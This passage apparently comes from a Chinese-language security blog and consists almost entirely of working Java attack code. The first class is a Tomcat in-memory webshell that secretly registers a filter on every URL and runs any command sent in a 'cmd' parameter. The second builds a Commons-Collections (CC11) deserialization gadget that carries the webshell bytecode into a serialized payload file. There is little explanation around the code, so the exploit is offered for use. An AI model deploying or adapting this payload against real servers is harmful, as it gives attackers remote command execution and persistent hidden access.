import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.LifecycleState;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;

import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;

/**
 * @author threedr3am
 */
public class TomcatInject extends AbstractTranslet implements Filter {

    /**
     * webshell命令参数名
     */
    private final String cmdParamName = "cmd";
    private final static String filterUrlPattern = "/*";
    private final static String filterName = "KpLi0rn";

    static {
        try {
            ServletContext servletContext = getServletContext();
            if (servletContext != null){
                Field ctx = servletContext.getClass().getDeclaredField("context");
                ctx.setAccessible(true);
                ApplicationContext appctx = (ApplicationContext) ctx.get(servletContext);

                Field stdctx = appctx.getClass().getDeclaredField("context");
                stdctx.setAccessible(true);
                StandardContext standardContext = (StandardContext) stdctx.get(appctx);

                if (standardContext != null){
                    // 这样设置不会抛出报错
                    Field stateField = org.apache.catalina.util.LifecycleBase.class
                            .getDeclaredField("state");
                    stateField.setAccessible(true);
                    stateField.set(standardContext, LifecycleState.STARTING_PREP);

                    Filter myFilter =new TomcatInject();
                    // 调用 doFilter 来动态添加我们的 Filter
                    // 这里也可以利用反射来添加我们的 Filter
                    javax.servlet.FilterRegistration.Dynamic filterRegistration =
                            servletContext.addFilter(filterName,myFilter);

                    // 进行一些简单的设置
                    filterRegistration.setInitParameter("encoding", "utf-8");
                    filterRegistration.setAsyncSupported(false);
                    // 设置基本的 url pattern
                    filterRegistration
                            .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,
                                    new String[]{"/*"});

                    // 将服务重新修改回来，不然的话服务会无法正常进行
                    if (stateField != null){
                        stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);
                    }

                    // 在设置之后我们需要 调用 filterstart
                    if (standardContext != null){
                        // 设置filter之后调用 filterstart 来启动我们的 filter
                        Method filterStartMethod = StandardContext.class.getDeclaredMethod("filterStart");
                        filterStartMethod.setAccessible(true);
                        filterStartMethod.invoke(standardContext,null);

                        /**
                         * 将我们的 filtermap 插入到最前面
                         */

                        Class ccc = null;
                        try {
                            ccc = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                        } catch (Throwable t){}
                        if (ccc == null) {
                            try {
                                ccc = Class.forName("org.apache.catalina.deploy.FilterMap");
                            } catch (Throwable t){}
                        }
                        //把filter插到第一位
                        Method m = Class.forName("org.apache.catalina.core.StandardContext")
                                .getDeclaredMethod("findFilterMaps");
                        Object[] filterMaps = (Object[]) m.invoke(standardContext);
                        Object[] tmpFilterMaps = new Object[filterMaps.length];
                        int index = 1;
                        for (int i = 0; i < filterMaps.length; i++) {
                            Object o = filterMaps[i];
                            m = ccc.getMethod("getFilterName");
                            String name = (String) m.invoke(o);
                            if (name.equalsIgnoreCase(filterName)) {
                                tmpFilterMaps[0] = o;
                            } else {
                                tmpFilterMaps[index++] = filterMaps[i];
                            }
                        }
                        for (int i = 0; i < filterMaps.length; i++) {
                            filterMaps[i] = tmpFilterMaps[i];
                        }
                    }
                }

            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static ServletContext getServletContext()
            throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        ServletRequest servletRequest = null;
        /*shell注入，前提需要能拿到request、response等*/
        Class c = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
        java.lang.reflect.Field f = c.getDeclaredField("lastServicedRequest");
        f.setAccessible(true);
        ThreadLocal threadLocal = (ThreadLocal) f.get(null);
        //不为空则意味着第一次反序列化的准备工作已成功
        if (threadLocal != null && threadLocal.get() != null) {
            servletRequest = (ServletRequest) threadLocal.get();
        }
        //如果不能去到request，则换一种方式尝试获取

        //spring获取法1
        if (servletRequest == null) {
            try {
                c = Class.forName("org.springframework.web.context.request.RequestContextHolder");
                Method m = c.getMethod("getRequestAttributes");
                Object o = m.invoke(null);
                c = Class.forName("org.springframework.web.context.request.ServletRequestAttributes");
                m = c.getMethod("getRequest");
                servletRequest = (ServletRequest) m.invoke(o);
            } catch (Throwable t) {}
        }
        if (servletRequest != null)
            return servletRequest.getServletContext();

        //spring获取法2
        try {
            c = Class.forName("org.springframework.web.context.ContextLoader");
            Method m = c.getMethod("getCurrentWebApplicationContext");
            Object o = m.invoke(null);
            c = Class.forName("org.springframework.web.context.WebApplicationContext");
            m = c.getMethod("getServletContext");
            ServletContext servletContext = (ServletContext) m.invoke(o);
            return servletContext;
        } catch (Throwable t) {}
        return null;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
            throws TransletException {

    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse,
                         FilterChain filterChain) throws IOException, ServletException {
        System.out.println(
                "TomcatShellInject doFilter.....................................................................");
        String cmd;
        if ((cmd = servletRequest.getParameter(cmdParamName)) != null) {
            Process process = Runtime.getRuntime().exec(cmd);
            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }
            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
            return;
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {

    }
}
Code language: JavaScript (javascript)

利用 cc11 来进行注入

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;

@SuppressWarnings("all")
public class CC11Template {

    public static void main(String[] args) throws Exception {
        byte[] bytes = getBytes();
        byte[][] targetByteCodes = new byte[][]{bytes};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();

        Field f0 = templates.getClass().getDeclaredField("_bytecodes");
        f0.setAccessible(true);
        f0.set(templates,targetByteCodes);

        f0 = templates.getClass().getDeclaredField("_name");
        f0.setAccessible(true);
        f0.set(templates,"name");

        f0 = templates.getClass().getDeclaredField("_class");
        f0.setAccessible(true);
        f0.set(templates,null);

        // 利用反射调用 templates 中的 newTransformer 方法
        InvokerTransformer transformer = new InvokerTransformer("asdfasdfasdf", new Class[0], new Object[0]);
        HashMap innermap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap,transformer);
        TiedMapEntry tiedmap = new TiedMapEntry(map,templates);
        HashSet hashset = new HashSet(1);
        hashset.add("foo");
        // 我们要设置 HashSet 的 map 为我们的 HashMap
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        f.setAccessible(true);
        HashMap hashset_map = (HashMap) f.get(hashset);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        f2.setAccessible(true);
        Object[] array = (Object[])f2.get(hashset_map);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }
        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        keyField.setAccessible(true);
        keyField.set(node,tiedmap);

        // 在 invoke 之后，
        Field f3 = transformer.getClass().getDeclaredField("iMethodName");
        f3.setAccessible(true);
        f3.set(transformer,"newTransformer");

        try{
          //ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc11Step1.ser"));
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc11Step2.ser"));
            outputStream.writeObject(hashset);
            outputStream.close();

        }catch(Exception e){
            e.printStackTrace();
        }
    }

    public static byte[] getBytes() throws IOException {
      //    第一次
//        InputStream inputStream = new FileInputStream(new File("./TomcatEcho.class"));
      //  第二次  
      InputStream inputStream = new FileInputStream(new File("./TomcatInject.class"));

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        int n = 0;
        while ((n=inputStream.read())!=-1){
            byteArrayOutputStream.write(n);
        }
        byte[] bytes = byteArrayOutputStream.toByteArray();
        return bytes;
    }
}